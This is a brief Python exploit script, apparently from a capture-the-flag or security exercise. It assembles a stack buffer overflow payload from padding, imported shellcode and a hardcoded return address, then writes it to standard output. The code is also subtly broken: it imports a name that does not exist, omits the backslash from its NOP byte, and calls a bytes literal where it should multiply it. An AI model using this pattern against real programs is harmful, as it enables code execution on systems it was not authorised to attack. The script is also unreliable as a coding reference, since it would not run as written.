import sys
from struct import struct
from shellcode import shellcode


padding = b'x90'(1024 - (len(shellcode)))

buf_address = pack('<I', 0xfff6dc70)

payload = padding + shellcode + buf_address

sys.stdout.buffer.write(payload)
